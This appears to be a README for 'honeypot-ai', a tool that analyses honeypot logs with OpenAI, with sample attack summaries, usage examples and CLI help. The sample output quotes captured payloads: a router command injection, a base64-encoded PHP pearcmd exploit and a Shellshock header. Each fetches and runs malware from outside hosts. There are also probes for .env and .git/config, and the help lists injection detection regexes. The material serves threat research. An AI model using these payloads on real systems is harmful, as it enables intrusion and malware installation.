most_common_src_ip:
'188.166.224.136'


Attack (hhash: ffc86c13c2614123fced454ae877687ceae7759a81df85d61960f7c2079faf59), SourceIPs: 1, Sessions: 228, HTTP: 32, Httplogs: 15 
first_session:
Session CHYq8ERmMt1PGEUo8 CONN 185.224.128.191:54040 -> 172.31.5.68:5555 Duration: 0.00s

last2_sessions:
[Session CPiuqv4xidHXaJiZj CONN 185.224.128.191:49943 -> 172.31.5.68:80 Duration: 0.00s,
 Session CbD4QMgcbiYojj7Vi CONN 185.224.128.191:58813 -> 172.31.5.68:80 Duration: 0.00s]

most_common3_http_requests:
[('GET / HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
  '(KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46
'
  'Host: 54.67.87.80',
  8),
 ('GET / HTTP/1.1
Host: 54.67.87.80:80', 6),
 ('GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd '
  '/tmp; rm -rf *; wget http://104.168.5.4/tenda.sh; chmod 777 '
  'tenda.sh;./tenda.sh) HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
  '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
'
  'Host: 54.67.87.80:80',
  6)]

most_common_src_ip:
'185.224.128.191'


Attack (hhash: 7da13397216e915d3648622960fa18ea26295ad5f180cf1346511991dc689ea9), SourceIPs: 1, Sessions: 142, HTTP: 142, Httplogs: 71 
first_session:
Session C5fd7HX24xXqTC1g2 HTTP 91.92.243.167:59610 -> 172.31.5.68:80 HTTP Requests: 1, Duration: 0.14s

last2_sessions:
[Session COSa9h4j59vCDlWdSe HTTP 91.92.243.167:58604 -> 172.31.5.68:80 HTTP Requests: 1, Duration: 0.15s,
 Session CBz8tm2MN6hD78aoY5 HTTP 91.92.243.167:58620 -> 172.31.5.68:80 HTTP Requests: 1, Duration: 0.23s]

most_common3_http_requests:
[('GET /.git/config HTTP/1.1
'
  'User-Agent: python-requests/2.28.1
'
  'Host: 54.67.87.80',
  2),
 ('GET /.env.production HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) '
  'Gecko/20100101 Firefox/77.0
'
  'Host: 54.67.87.80',
  2),
 ('POST /.env.production HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) '
  'Gecko/20100101 Firefox/77.0
'
  'Host: 54.67.87.80',
  2)]

most_common_src_ip:
'91.92.243.167'


Attack (hhash: ed38805b5dd55c277dcbebb9c4db218b036f9cae287ba106cc774ec3da18bfcf), SourceIPs: 1, Sessions: 54, HTTP: 27, Httplogs: 27 
first_session:
Session CwvCUE4POeNmeZAfFg CONN 23.20.205.139:59850 -> 172.31.5.68:443 Duration: 0.00s

last2_sessions:
[Session C8iksu3D9PMnSE2pbc HTTP 23.20.205.139:46168 -> 172.31.5.68:80 HTTP Requests: 1, Duration: 0.13s,
 Session CgW8KPq1gTtel3HZj HTTP 23.20.205.139:46180 -> 172.31.5.68:80 HTTP Requests: 1, Duration: 0.12s]

most_common3_http_requests:
[('GET / HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, '
  'like Gecko) Chrome/66.0.3359.139 Safari/537.36
'
  'Host: 54.67.87.80',
  1),
 ('GET /wp-content/themes/twentytwentyone/assets/js/polyfills.js HTTP/1.1
'
  'User-Agent: Mozilla/4.0 (PSP (PlayStation Portable); 2.00)
'
  'Host: 54.67.87.80',
  1),
 ('GET /wp-content/themes/twentytwentyone/assets/js/responsive-embeds.js '
  'HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) '
  'AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 '
  'Safari/604.1
'
  'Host: 54.67.87.80',
  1)]

most_common_src_ip:
'23.20.205.139'


Attack (hhash: 4da3ee2625bb069ebb113ec1ce45b4f5b8ec39e3e743330b94f6c15e4c25f84a), SourceIPs: 1, Sessions: 35, HTTP: 30, Httplogs: 26 
first_session:
Session C6GMNJ29OcYte6iBGg HTTP 185.180.143.80:54878 -> 172.31.5.68:8000 HTTP Requests: 1, Duration: 0.02s

last2_sessions:
[Session CCGF0P2MuxPQR5Zah1 CONN 185.180.143.80:12525 -> 172.31.5.68:4443 Duration: 0.00s,
 Session C6WSwBooNNgc2piy6 CONN 185.180.143.80:21932 -> 172.31.5.68:6161 Duration: 0.00s]

most_common3_http_requests:
[('GET / HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
  '(KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 
'
  'Host: 54.67.87.80',
  4),
 ('GET / HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
  '(KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 
'
  'Host: 54.67.87.80:8000',
  2),
 ('GET /admin/ HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
  '(KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 
'
  'Host: 54.67.87.80:8000',
  1)]

most_common_src_ip:
'185.180.143.80'


Attack (hhash: 30d72557f4e8b64fba88e86ce784ac08339fca517863f30d194830c90ff72a01), SourceIPs: 1, Sessions: 33, HTTP: 2, Httplogs: 2 
first_session:
Session C7cVGo4a8R7SRoNVAd CONN 45.95.147.236:54366 -> 172.31.5.68:8443 Duration: 0.00s

last2_sessions:
[Session CVumQ7G74UTf8m6S4 CONN 45.95.147.236:51881 -> 172.31.5.68:80 Duration: 0.00s,
 Session CXBc762qpcxfWQwz6b CONN 45.95.147.236:60484 -> 172.31.5.68:8080 Duration: 0.00s]

most_common3_http_requests:
[('GET '
  '/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_decode("bWtkaXIgLXAgL3RtcC8kKHdob2FtaSkgJiYgY2QgL3RtcC8kKHdob2FtaSk7IHdnZXQgaHR0cDovLzQ1Ljk1LjE0Ny4yMzYvZG93bmxvYWQvcmVkdGFpbC54ODZfNjQ7IGN1cmwgLU8gaHR0cDovLzQ1Ljk1LjE0Ny4yMzYvZG93bmxvYWQvcmVkdGFpbC54ODZfNjQ7IHJtIC1yZiAucmVkdGFpbDsgbXYgcmVkdGFpbC54ODZfNjQgLnJlZHRhaWw7IGNobW9kICt4IC5yZWR0YWlsOyAuLy5yZWR0YWls"));?>+/tmp/ohhellohttpserver.php '
  'HTTP/1.1
'
  'User-Agent: Mozilla/5.0
'
  'Host: 54.67.87.80:8080',
  1),
 ('GET /index.php?lang=../../../../../../../../tmp/ohhellohttpserver HTTP/1.1
'
  'User-Agent: Mozilla/5.0
'
  'Host: 54.67.87.80:8080',
  1),
 ('GET '
  '/index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=echo${IFS}bWtkaXIgLXAgL3RtcC8kKHdob2FtaSkgJiYgY2QgL3RtcC8kKHdob2FtaSk7IHdnZXQgaHR0cDovLzQ1Ljk1LjE0Ny4yMzYvZG93bmxvYWQvcmVkdGFpbC54ODZfNjQ7IGN1cmwgLU8gaHR0cDovLzQ1Ljk1LjE0Ny4yMzYvZG93bmxvYWQvcmVkdGFpbC54ODZfNjQ7IHJtIC1yZiAucmVkdGFpbDsgbXYgcmVkdGFpbC54ODZfNjQgLnJlZHRhaWw7IGNobW9kICt4IC5yZWR0YWlsOyAuLy5yZWR0YWls|base64${IFS}-d|sh '
  'HTTP/1.1
'
  'User-Agent: Mozilla/5.0
'
  'Host: 54.67.87.80:8080',
  1)]

most_common_src_ip:
'45.95.147.236'


Attack (hhash: 79cee4cdd57b016e9a6cdc9b23385b110da33ec808b64670bcf45b0661db1a65), SourceIPs: 1, Sessions: 28, HTTP: 24, Httplogs: 24 
first_session:
Session CXyjgw3giMpwbnX8mf CONN 43.135.123.64:49851 -> 172.31.5.68:2087 Duration: 0.00s

last2_sessions:
[Session C8hVWl2XuyzMovNMbb HTTP 43.135.123.64:46658 -> 172.31.5.68:7547 HTTP Requests: 2, Duration: 0.38s,
 Session C2FXxC3hFwyOBoillf CONN 43.135.123.64:51746 -> 172.31.5.68:8222 Duration: 0.00s]

most_common3_http_requests:
[('GET /c/msdownload/update/software/update/2021/11/6632de33-967441-x86.cab '
  'HTTP/1.1
'
  'User-Agent: Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.31
'
  'Host: docs.microsoft.com',
  2),
 ("GET /fw6I HTTP/1.1
User-Agent: 'Mozilla/5.0
Host: 54.67.87.80:7547", 2),
 ('GET /Visu/ens/events HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, '
  'like Gecko) Chrome/58.0.3029.110 Safari/537.36
'
  'Host: www.wlanquna.club',
  2)]

most_common_src_ip:
'43.135.123.64'


Attack (hhash: 0b60b47c6cbbec8f0c44289158db12490185b6ef821e8b1946a745c8b300ac67), SourceIPs: 1, Sessions: 25, HTTP: 23, Httplogs: 22 
first_session:
Session C3rmlzfEy0UPa8mb1 CONN 43.132.196.160:50610 -> 172.31.5.68:8080 Duration: 0.00s

last2_sessions:
[Session Cv6GCY3drkYmCucib7 HTTP 43.132.196.160:46642 -> 172.31.5.68:8080 HTTP Requests: 2, Duration: 0.42s,
 Session CifZdo1MREegnAQ1p HTTP 43.132.196.160:49132 -> 172.31.5.68:8080 HTTP Requests: 2, Duration: 0.35s]

most_common3_http_requests:
[("GET /is-bin HTTP/1.1
User-Agent: 'Mozilla/5.0
Host: 54.67.87.80:8080", 2),
 ('GET /c/msdownload/update/software/update/2021/11/6632de33-967441-x86.cab '
  'HTTP/1.1
'
  'User-Agent: Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.31
'
  'Host: docs.microsoft.com',
  2),
 ("GET /fw6I HTTP/1.1
User-Agent: 'Mozilla/5.0
Host: 54.67.87.80:8080", 2)]

most_common_src_ip:
'43.132.196.160'


Attack (hhash: f9a22a65178153d25e6a84189570709a0aced94197404093eff5cea464b865ac), SourceIPs: 1, Sessions: 14, HTTP: 12, Httplogs: 11 
first_session:
Session CzVBvw15Ia4YRT90Ka CONN 20.197.51.98:58486 -> 172.31.5.68:443 Duration: 0.00s

last2_sessions:
[Session CxQ8S34sWDwgSQOGK HTTP 20.197.51.98:60346 -> 172.31.5.68:80 HTTP Requests: 1, Duration: 0.24s,
 Session CY4lDyZD0Vw1FyUT6 CONN 20.197.51.98:58486 -> 172.31.5.68:443 Duration: 0.00s]

most_common3_http_requests:
[('POST /debug/default/view?panel=config HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like '
  'Gecko) Chrome/81.0.4044.129 Safari/537.36
'
  'Host: 54.67.87.80',
  2),
 ('GET /_profiler/phpinfo HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like '
  'Gecko) Chrome/81.0.4044.129 Safari/537.36
'
  'Host: 54.67.87.80',
  1),
 ('POST / HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like '
  'Gecko) Chrome/81.0.4044.129 Safari/537.36
'
  'Host: 54.67.87.80',
  1)]

most_common_src_ip:
'20.197.51.98'


Attack (hhash: a23e9121e296bd9ba20a37c2cc6f2fab5285e2f6efd635841d835724544d6758), SourceIPs: 1, Sessions: 11, HTTP: 10, Httplogs: 10 
first_session:
Session CIfXlarfWch5BymT2 HTTP 103.121.39.54:41202 -> 172.31.5.68:7547 HTTP Requests: 1314, Duration: 0.20s

last2_sessions:
[Session CaLotx1yPF7Xp2BDI2 HTTP 103.121.39.54:48982 -> 172.31.5.68:80 HTTP Requests: 1, Duration: 0.25s,
 Session CM4iUY1mQ1gPY5NlKb HTTP 103.121.39.54:48986 -> 172.31.5.68:80 HTTP Requests: 1, Duration: 0.25s]

most_common3_http_requests:
[('GET /env/.env HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) '
  'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
'
  'Host: 54.67.87.80:7547',
  2),
 ('GET /phpinfo HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) '
  'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
'
  'Host: 54.67.87.80:7547',
  2),
 ('GET /xampp/info.php HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) '
  'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
'
  'Host: 54.67.87.80:7547',
  2)]

most_common_src_ip:
'103.121.39.54'


Attack (mhash: 249a049e611f83823c514eb7b904977ae94371768ea3a93160378a9f757827cc), SourceIPs: 1, Sessions: 8, SSH: 8, Malware: 1 
first_session:
Session CD3w3NQngIy0Vxbb5 SSH 208.65.84.32:46428 -> 172.31.5.68:22 Duration: 0.00s

last2_sessions:
[Session 0f56e4ab5c5e SSH 208.65.84.32:48792 -> 172.31.5.68:2222 Duration: 0.27s,
 Session 94481499960a SSH 208.65.84.32:45848 -> 172.31.5.68:2222 Login: root:linux Malware: 1, Duration: 0.78s]

most_common3_http_requests:
[]

most_common_src_ip:
'208.65.84.32'


Attack (hhash: bc816b9b031183662a273fbc558312d1b2950f19a0d2d91345474a152011f6bf), SourceIPs: 1, Sessions: 8, HTTP: 4, Httplogs: 1 
first_session:
Session CfHYaj1MdqYtJ9SyZc CONN 120.63.180.123:47709 -> 172.31.5.68:5555 Duration: 0.00s

last2_sessions:
[Session CFe87nVCHMwOJKh0e HTTP 120.63.180.123:37436 -> 172.31.5.68:80 HTTP Requests: 2, Duration: 0.01s,
 Session CaMEj84QGYb3Lrm6x1 HTTP 120.63.180.123:37514 -> 172.31.5.68:80 HTTP Requests: 2, Duration: 0.27s]

most_common3_http_requests:
[('POST /cgi-bin/luci/;stok=/locale?form=country HTTP/1.1
', 4),
 ('POST /cgi-bin/luci/;stok=/locale?form=country HTTP/
', 4)]

most_common_src_ip:
'120.63.180.123'


Attack (mhash: 7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d), SourceIPs: 1, Sessions: 4, SSH: 4, Malware: 1 
first_session:
Session CSLCSB1mQZOxxNLbb SSH 64.23.130.198:44190 -> 172.31.5.68:22 Duration: 0.00s

last2_sessions:
[Session 247e8f389bbd SSH 64.23.130.198:44190 -> 172.31.5.68:2222 Duration: 0.05s,
 Session 07fc63891a54 SSH 64.23.130.198:44200 -> 172.31.5.68:2222 Login: root:debian Malware: 1, Duration: 0.51s]

most_common3_http_requests:
[]

most_common_src_ip:
'64.23.130.198'


Attack (hhash: 846f2a6c936a5c60bf416fa277a315d852da3ed0f52d2c9e22aca882ad3e17d2), SourceIPs: 1, Sessions: 4, HTTP: 4, Httplogs: 3 
first_session:
Session Cs9wgp1ZBgxUt2Jr7i HTTP 123.99.201.37:51531 -> 172.31.5.68:8080 HTTP Requests: 1, Duration: 0.15s

last2_sessions:
[Session CUd3x845Q5fiXTGgfg HTTP 123.99.201.37:54578 -> 172.31.5.68:80 HTTP Requests: 1, Duration: 0.14s,
 Session CkaJEd5MosM5dEHjg HTTP 123.99.201.37:55552 -> 172.31.5.68:80 HTTP Requests: 1, Duration: 0.15s]

most_common3_http_requests:
[('GET /manager/html HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; '
  'Trident/6.0)
'
  'Host: 54.67.87.80:8080',
  2),
 ('GET / HTTP/1.1
'
  'User-Agent: () { :; }; /bin/bash -c "rm -rf /tmp/*;echo wget '
  'http://houmen.linux22.cn/houmen/linux223 -O /tmp/China.Z-dukk >> '
  '/tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 '
  '/tmp/China.Z-dukk >> /tmp/Run.sh;echo /tmp/China.Z-dukk >> /tmp/Run.sh;echo '
  'rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh"
'
  'Host: 54.67.87.80
'
  'Referrer: () { :; }; /bin/bash -c "rm -rf /tmp/*;echo wget '
  'http://houmen.linux22.cn/houmen/linux223 -O /tmp/China.Z-dukk >> '
  '/tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 '
  '/tmp/China.Z-dukk >> /tmp/Run.sh;echo /tmp/China.Z-dukk >> /tmp/Run.sh;echo '
  'rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh"',
  1),
 ('GET / HTTP/1.1
'
  'User-Agent: () { :; }; /bin/bash -c "rm -rf /tmp/*;echo wget '
  'http://houmen.linux22.cn/houmen/linux223 -O /tmp/China.Z-gsub >> '
  '/tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 '
  '/tmp/China.Z-gsub >> /tmp/Run.sh;echo /tmp/China.Z-gsub >> /tmp/Run.sh;echo '
  'rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh"
'
  'Host: 54.67.87.80
'
  'Referrer: () { :; }; /bin/bash -c "rm -rf /tmp/*;echo wget '
  'http://houmen.linux22.cn/houmen/linux223 -O /tmp/China.Z-gsub >> '
  '/tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 '
  '/tmp/China.Z-gsub >> /tmp/Run.sh;echo /tmp/China.Z-gsub >> /tmp/Run.sh;echo '
  'rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh"',
  1)]

most_common_src_ip:
'123.99.201.37'


Attack (chash: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199), SourceIPs: 1, Sessions: 3, SSH: 2, Commands: 21, Cmdlogs: 1, 
first_session:
Session CZTsog4mK2qlnX5z39 CONN 47.120.37.43:39554 -> 172.31.5.68:2222 Duration: 0.00s

last2_sessions:
[Session ClTf1A34WgU8CTeDal SSH 47.120.37.43:37534 -> 172.31.5.68:2222 Duration: 0.00s,
 Session 3334db81db98 SSH 47.120.37.43:37534 -> 172.31.5.68:2222 Login: root:12345678 Commands: 21, Duration: 0.11s]

most_common3_http_requests:
[]

most_common_src_ip:
'47.120.37.43'


Honeypot AI Finished Successfully!
```

</details>


> Load only attacks with IDs XXXX and YYYY from the attacks directory then print the unique sessions and unique source IPs for each attack

```bash
honeypot-ai/run.sh -lfa --only-attacks XXXX YYYY --print-attrs uniq_sessions uniq_source_ips
```

<details>
<summary>
Output
</summary>


```

```

</details>


> Analyze attack with ID XXXX using OpenAI and OSINT analyzers then write markdown and export to reports directory

```bash
honeypot-ai/run.sh -lfa --only-attack XXXX --analyze --write-markdown --export-report
```

<details>
<summary>
Output
</summary>


```

```

</details>


> Enter chat mode to ask custom questions about attack with ID XXXX before analyzing, writing markdown, and exporting

```bash
honeypot-ai/run.sh -lfa --only-attack XXXX -AWE --chat
```

<details>
<summary>
Output
</summary>


```

```

</details>


> Enter interactive Python shell to manually modify attacks before analyzing, writing markdown, and exporting

```bash
honeypot-ai/run.sh -lfa -AWE --interact
```

<details>
<summary>
Output
</summary>


```

```

</details>


> Update config file with values from command line arguments

```bash
honeypot-ai/run.sh --config config.json --update-config --openai-api-key YOUR_API_KEY
```

<details>
<summary>
Output
</summary>


```

```

</details>



</details>

---


<details>
<summary>
<h2>Advanced Usage</h2>
</summary>


### All Command Line Arguments

```bash
usage: main.py [-h] [--list-attacks] [--print-attrs ATTACK_ATTRS [ATTACK_ATTRS ...]] [--organize-attacks] [--analyze-attacks] [--chat] [--write-reports] [--export-reports] [--interactive] [--config FILE]
               [--update-config] [--load-from-logs] [--load-from-attacks-dir] [--only-attacks ATTACK_IDS [ATTACK_IDS ...]] [--skip-attacks ATTACK_IDS [ATTACK_IDS ...]] [--max-ips-per-attack MAX_IPS_PER_ATTACK]
               [--max-attacks MAX_ATTACKS] [--sort-attrs SORT_ATTRS [SORT_ATTRS ...]] [--sort-order SORT_ORDER] [--load-attacks-max-workers LOAD_ATTACKS_MAX_WORKERS] [--log-types LOG_TYPES [LOG_TYPES ...]]
               [--zeek-log-types ZEEK_LOG_TYPES [ZEEK_LOG_TYPES ...]] [--zeek-log-ext ZEEK_LOG_EXT] [--zeek-keep-empty-fields | --no-zeek-keep-empty-fields]
               [--zeek-keep-unset-fields | --no-zeek-keep-unset-fields] [--attack-min-commands ATTACK_MIN_COMMANDS] [--attack-min-malware ATTACK_MIN_MALWARE]
               [--attack-min-successful-logins ATTACK_MIN_SUCCESSFUL_LOGINS] [--attack-min-http-requests ATTACK_MIN_HTTP_REQUESTS]
               [--attack-http-uri-regexes ATTACK_HTTP_URI_REGEXES [ATTACK_HTTP_URI_REGEXES ...]] [--attack-http-anywhere-regexes ATTACK_HTTP_ANYWHERE_REGEXES [ATTACK_HTTP_ANYWHERE_REGEXES ...]]
               [--standardize-regex-commands STANDARDIZE_REGEX_COMMANDS [STANDARDIZE_REGEX_COMMANDS ...]] [--standardize-regex-malware STANDARDIZE_REGEX_MALWARE [STANDARDIZE_REGEX_MALWARE ...]]
               [--standardize-regex-http-requests STANDARDIZE_REGEX_HTTP_REQUESTS [STANDARDIZE_REGEX_HTTP_REQUESTS ...]] [--merge-shared-attrs MERGE_SHARED_ATTRS [MERGE_SHARED_ATTRS ...]]
               [--merge-regex-commands MERGE_REGEX_COMMANDS [MERGE_REGEX_COMMANDS ...]] [--merge-regex-malware MERGE_REGEX_MALWARE [MERGE_REGEX_MALWARE ...]]
               [--merge-regex-http-requests MERGE_REGEX_HTTP_REQUESTS [MERGE_REGEX_HTTP_REQUESTS ...]] [--organizer-overwrite | --no-organizer-overwrite | --overwrite | --no-overwrite]
               [--organizer-iterby ORGANIZER_ITERBY] [--organizer-concurrency-type ORGANIZER_CONCURRENCY_TYPE] [--organizer-max-workers ORGANIZER_MAX_WORKERS] [--organizer-chunksize ORGANIZER_CHUNKSIZE]
               [--organizer-yield-order ORGANIZER_YIELD_ORDER] [--organizer-ip-subdirs | --no-organizer-ip-subdirs | --ip-subdirs | --no-ip-subdirs] [--use-openai | --no-use-openai | --openai | --no-openai]
               [--use-openai-code-interpreter | --no-use-openai-code-interpreter | --openai-code-interpreter | --no-openai-code-interpreter] [--openai-api-key OPENAI_API_KEY] [--openai-model OPENAI_MODEL]
               [--openai-training-data-path OPENAI_TRAINING_DATA_PATH] [--use-ipanalyzer | --no-use-ipanalyzer | --ipanalyzer | --no-ipanalyzer]
               [--ipanalyzer-sources IPANALYZER_SOURCES [IPANALYZER_SOURCES ...]] [--ipanalyzer-max-errors IPANALYZER_MAX_ERRORS] [--webdriver-path WEBDRIVER_PATH] [--webdriver-type WEBDRIVER_TYPE]
               [--use-malwareanalyzer | --no-use-malwareanalyzer | --malwareanalyzer | --no-malwareanalyzer] [--malwareanalyzer-sources MALWAREANALYZER_SOURCES [MALWAREANALYZER_SOURCES ...]]
               [--malwareanalyzer-max-errors MALWAREANALYZER_MAX_ERRORS] [--malwareanalyzer-allow-downloads | --no-malwareanalyzer-allow-downloads] [--user-ips USER_IPS [USER_IPS ...]]
               [--honeypot-external-ips HONEYPOT_EXTERNAL_IPS [HONEYPOT_EXTERNAL_IPS ...]] [--honeypot-internal-ips HONEYPOT_INTERNAL_IPS [HONEYPOT_INTERNAL_IPS ...]]
               [--honeypot-ports HONEYPOT_PORTS [HONEYPOT_PORTS ...]] [--honeypot-software HONEYPOT_SOFTWARE [HONEYPOT_SOFTWARE ...]] [--logs-path LOGS_PATH] [--cowrie-logs-path COWRIE_LOGS_PATH]
               [--firewall-logs-path FIREWALL_LOGS_PATH] [--web-logs-path WEB_LOGS_PATH] [--zeek-logs-path ZEEK_LOGS_PATH] [--malware-downloads-path MALWARE_DOWNLOADS_PATH]
               [--auth-random-path AUTH_RANDOM_PATH] [--resources-path RESOURCES_PATH] [--attacks-path ATTACKS_PATH] [--db-path DB_PATH] [--ipdb-path IPDB_PATH] [--mwdb-path MWDB_PATH] [--aidb-path AIDB_PATH]
               [--reports-path REPORTS_PATH]

honeypot-ai: Honeypot Log Analyzer Built on OpenAI

options:
  -h, --help            show this help message and exit

Actions:
  Actions to perform on loaded attacks

  --list-attacks, --list, -L
                        List loaded attacks
  --print-attrs ATTACK_ATTRS [ATTACK_ATTRS ...], --print ATTACK_ATTRS [ATTACK_ATTRS ...], -P ATTACK_ATTRS [ATTACK_ATTRS ...]
                        Print specified attributes of loaded attacks
  --organize-attacks, --organize, -O
                        Organize attacks into attack directories
  --analyze-attacks, --analyze, -A
                        Analyze loaded attacks with OpenAI and OSINT Analyzers
  --chat, -C            Chat with the OpenAI Assistant about the loaded attacks
  --write-reports, --write, -W
                        Write markdown reports for analyzed attacks
  --export-reports, --export, -E
                        Export attack report and files to REPORTS_PATH
  --interactive, --interact, -I
                        Enter interactive mode after loading attacks (python shell with loaded attacks in the "ATTACKS" variable)

Config File:
  Config file to load settings from

  --config FILE, -c FILE
                        Path to config file
  --update-config, -u   Update config file with new values

Loading Attacks:
  Methods for loading attacks from logs or the attacks directory

  --load-from-logs, -lfl, -ll
                        Load attacks from logs
  --load-from-attacks-dir, -lfa, -la
                        Load attacks from attacks directory
  --only-attacks ATTACK_IDS [ATTACK_IDS ...]
                        Only load attacks with these keys
  --skip-attacks ATTACK_IDS [ATTACK_IDS ...]
                        Skip loading attacks with these keys
  --max-ips-per-attack MAX_IPS_PER_ATTACK
                        Maximum number of IPs in each loaded attack
  --max-attacks MAX_ATTACKS
                        Maximum number of attacks to load
  --sort-attrs SORT_ATTRS [SORT_ATTRS ...]
                        Order of attrs to sort attacks by (default: ['num_source_ips', 'num_sessions', 'num_commands', 'num_malware', 'num_http_requests'])
  --sort-order SORT_ORDER
                        Order to sort attacks by (asc or desc) (default: desc)
  --load-attacks-max-workers LOAD_ATTACKS_MAX_WORKERS
                        Maximum number of worker processes to use when loading attacks from the attacks directory (default: 2)

Log Types:
  Log types to process

  --log-types LOG_TYPES [LOG_TYPES ...]
                        Log types to process (default: ['cowrie', 'zeek'])
  --zeek-log-types ZEEK_LOG_TYPES [ZEEK_LOG_TYPES ...]
                        Zeek log types to process (default: ['http'])
  --zeek-log-ext ZEEK_LOG_EXT
                        Zeek log file extension (default: .log)
  --zeek-keep-empty-fields, --no-zeek-keep-empty-fields
                        Whether or not to keep empty fields in Zeek logs (default: True)
  --zeek-keep-unset-fields, --no-zeek-keep-unset-fields
                        Whether or not to keep unset fields in Zeek logs (default: False)
  --zeek-logs-path ZEEK_LOGS_PATH
                        Path to the zeek logs directory (Should be a subdirectory of LOGS_PATH) (default: ./logs/zeek)

Attack Conditions:
  Conditions for determining which SourceIPs should be included in an Attack

  --attack-min-commands ATTACK_MIN_COMMANDS, --min-commands ATTACK_MIN_COMMANDS
                        Minimum number of commands used for SourceIP included in an Attack (default: 1)
  --attack-min-malware ATTACK_MIN_MALWARE, --min-malware ATTACK_MIN_MALWARE
                        Minimum number of malware files for SourceIP included in an Attack (default: 1)
  --attack-min-successful-logins ATTACK_MIN_SUCCESSFUL_LOGINS, --min-successful-logins ATTACK_MIN_SUCCESSFUL_LOGINS
                        Minimum number of successful logins for SourceIP included in an Attack (default: 1)
  --attack-min-http-requests ATTACK_MIN_HTTP_REQUESTS, --min-http-requests ATTACK_MIN_HTTP_REQUESTS
                        Minimum number of HTTP requests for SourceIP included in an Attack (default: 1)
  --attack-http-uri-regexes ATTACK_HTTP_URI_REGEXES [ATTACK_HTTP_URI_REGEXES ...], --http-uri-regexes ATTACK_HTTP_URI_REGEXES [ATTACK_HTTP_URI_REGEXES ...]
                        Regexes to match anywhere in the HTTP request URI that should be considered attacks (default:
                        ['(\\||\\$|\\`|;|\\-\\-|\\{|\\}|\\[|\\]|\\(|\\)|<|>|\\\\|\\^|\\~|\\!|\\$?\\{?IFS\\}?|\\.\\/)'])
  --attack-http-anywhere-regexes ATTACK_HTTP_ANYWHERE_REGEXES [ATTACK_HTTP_ANYWHERE_REGEXES ...], --http-anywhere-regexes ATTACK_HTTP_ANYWHERE_REGEXES [ATTACK_HTTP_ANYWHERE_REGEXES ...]
                        Regexes to match anywhere in the HTTP request that should be considered attacks (default: ['(\\||\\$|\\`|\\{|\\}|<|>|\\\\[^n]|\\^|\\!|\\$?\\{?IFS\\}?|\\.\\/)'])

Standardization Regexes:
  Regexes to match in commands, malware, and HTTP requests that should be standardized before hashing and comparing values. All captured groups will be replaced with X.

  --standardize-regex-commands STANDARDIZE_REGEX_COMMANDS [STANDARDIZE_REGEX_COMMANDS ...]
                        Regexes to match in commands that should be standardized before hashing. All captured groups will be replaced with X before hashing. (default: ['/bin/busybox (\\w+)',
                        '/tmp/([\\w\\d]+)', '/tmp/[\\w\\d]+ ([\\w/\\+]+)', '(\\d+\\.\\d+\\.\\d+\\.\\d+[:/]\\d+)'])
  --standardize-regex-malware STANDARDIZE_REGEX_MALWARE [STANDARDIZE_REGEX_MALWARE ...]
                        Regexes to match in malware that should be standardized before hashing. All captured groups will be replaced with X before hashing. (default: ['C0755 4745 (\\S+)'])
